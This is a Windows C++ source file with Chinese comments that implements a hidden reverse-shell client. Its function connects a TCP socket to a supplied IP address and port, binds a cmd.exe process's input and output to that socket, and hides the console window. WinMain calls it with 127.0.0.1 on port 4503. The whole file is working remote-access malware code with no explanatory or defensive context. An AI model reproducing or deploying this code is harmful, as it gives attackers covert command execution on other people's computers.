// CmdShellClient.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "windows.h"
#include "Winsock2.h"
#pragma comment(lib,"ws2_32.lib")

SOCKET CmdShellS(char *szIPAdrees,int Port,HANDLE *hProcess)
{
	char szBuf[5*1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2,2),&wsaData))
		MessageBox(NULL,"初始化失败","Message",MB_OK);
	SOCKET sClient = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL,0,0);
	// 在sockaddr_in结构中装入服务器端地址信息
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons(Port);
	servAddr.sin_addr.S_un.S_addr =inet_addr(szIPAdrees);//服务器端ip
	//连接服务器端
	connect(sClient,(sockaddr*)&servAddr,sizeof(servAddr));

	//获得系统目录
	GetSystemDirectory(szBuf,256);
	lstrcat(szBuf,"\\cmd.exe");

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.hStdError=(void *)sClient;
	si.hStdInput=(void *)sClient;
	si.hStdOutput =(void *)sClient;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	CreateProcess(NULL,szBuf,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);
	(*hProcess)=pi.hProcess;

	return sClient;
} 

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	HANDLE hProcess;

	SOCKET s=CmdShellS("127.0.0.1",4503,&hProcess);
	WaitForSingleObject(hProcess,INFINITE);
	closesocket(s);
	WSACleanup();
	return 0;
}



